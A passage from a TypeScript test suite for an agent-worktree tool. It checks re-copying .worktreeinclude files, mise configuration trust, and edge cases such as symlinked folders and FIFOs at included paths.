    writeFileSync(join(task.worktree, "mise.toml"), '[env]\nA = "2"\n');

    writeFileSync(join(dir, "mise.local.toml"), '[env]\nB = "1"\n');
    writeFileSync(join(dir, ".worktreeinclude"), "mise.local.toml\n");
    await agents.copyIncludedFilesAgain(task.id);

    expect((await agents.taskMiseConfig(task.id)).changes).toEqual([
      { path: "mise.toml", change: "modified", content: '[env]\nA = "2"\n' },
    ]);
  }, 60_000);

  test("copying the included files again trusts a mise file the worktree already has with the root's content", async () => {
    const dir = makeRepo({ ".gitignore": "*.local.toml\n", "README.md": "#\n" }, "shop");
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "fix the login");
    // The user copied it by hand before adding it to .worktreeinclude.
    writeFileSync(join(dir, "mise.local.toml"), '[env]\nB = "1"\n');
    writeFileSync(join(task.worktree, "mise.local.toml"), '[env]\nB = "1"\n');
    writeFileSync(join(dir, ".worktreeinclude"), "mise.local.toml\n");
    expect((await agents.taskMiseConfig(task.id)).changes).toEqual([
      { path: "mise.local.toml", change: "added", content: '[env]\nB = "1"\n' },
    ]);

    expect((await agents.copyIncludedFilesAgain(task.id)).included).toEqual({ files: ["mise.local.toml"], problems: [] });
    expect((await agents.taskMiseConfig(task.id)).changes).toEqual([]);
  }, 60_000);

  test("copying the included files again leaves a task whose mise config was never trusted untrusted", async () => {
    const dir = makeRepo({ ".gitignore": "*.local.toml\n", "README.md": "#\n" }, "shop");
    const first = makeAgents({ shop: dir });
    const task = await first.agents.createTask("shop", "fix the login");
    await first.agents.stop(sessionOf(first.agents, task.id));
    first.agents.close();
    await first.procs.stopAll();
    // A task saved by a version before trusted mise configs has none.
    const file = join(first.home, "tasks.json");
    const saved = z.object({ tasks: z.array(z.record(z.string(), z.unknown())) }).parse(JSON.parse(readFileSync(file, "utf8")));
    writeFileSync(file, JSON.stringify({ tasks: saved.tasks.map(({ trustedMiseConfig: _, ...t }) => t) }));
    const { agents, procs } = makeAgents({ shop: dir }, first.home);
    cleanups.push(() => procs.stopAll());
    writeFileSync(join(dir, "mise.local.toml"), '[env]\nB = "1"\n');
    writeFileSync(join(dir, ".worktreeinclude"), "mise.local.toml\n");

    await agents.copyIncludedFilesAgain(task.id);

    expect(await agents.taskMiseConfig(task.id)).toMatchObject({ neverTrusted: true });
    agents.close();
  }, 60_000);

  // Git on Windows checks out a link as a text file by default, and creating one needs a privilege.
  test.skipIf(process.platform === "win32")(
    "copying the included files again saves what it copied when the worktree's mise config cannot be read, and trusts nothing new",
    async () => {
      const dir = makeRepo({ ".gitignore": "*.local.toml\nmise/\n", "README.md": "#\n" }, "shop");
      const { agents, procs } = makeAgents({ shop: dir });
      cleanups.push(() => procs.stopAll());
      const task = await agents.createTask("shop", "fix the login");
      // The agent links a mise folder to somewhere else, which the mise config refuses to read.
      symlinkSync(mkdtempSync(join(tmpdir(), "trackwall-outside-")), join(task.worktree, "mise"));
      writeFileSync(join(dir, "mise.local.toml"), '[env]\nB = "1"\n');
      writeFileSync(join(dir, ".worktreeinclude"), "mise.local.toml\n");

      expect((await agents.copyIncludedFilesAgain(task.id)).included).toEqual({ files: ["mise.local.toml"], problems: [] });

      rmSync(join(task.worktree, "mise"));
      expect((await agents.taskMiseConfig(task.id)).changes).toEqual([
        { path: "mise.local.toml", change: "added", content: '[env]\nB = "1"\n' },
      ]);
    },
    60_000,
  );

  // A FIFO needs mkfifo, which Windows does not have.
  test.skipIf(process.platform === "win32")(
    "copying the included files again leaves a FIFO the agent put at an included path alone instead of blocking on it",
    async () => {
      const dir = makeRepo({ ".gitignore": ".env\n", "README.md": "#\n" }, "shop");
      const { agents, procs } = makeAgents({ shop: dir });
      cleanups.push(() => procs.stopAll());
      const task = await agents.createTask("shop", "fix the login");
      execFileSync("mkfifo", [join(task.worktree, ".env")]);
      writeFileSync(join(dir, ".env"), "API_TOKEN=local\n");
      writeFileSync(join(dir, ".worktreeinclude"), ".env\n");

      expect((await agents.copyIncludedFilesAgain(task.id)).included).toEqual({
        files: [],
        problems: [".env: the worktree has its own version of it, left as it is"],
      });
    },
    60_000,
  );

  test("a repo root without .worktreeinclude copies nothing into a new task's worktree", async () => {
    const { dir } = cloneOnFeatureBranch();
    writeFileSync(join(dir, ".env"), "API_TOKEN=local\n");
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());

    const task = await agents.createTask("shop", "fix the login");

    expect(task.included).toEqual({ files: [], problems: [] });
    expect(existsSync(join(task.worktree, ".env"))).toBe(false);
  }, 60_000);
});
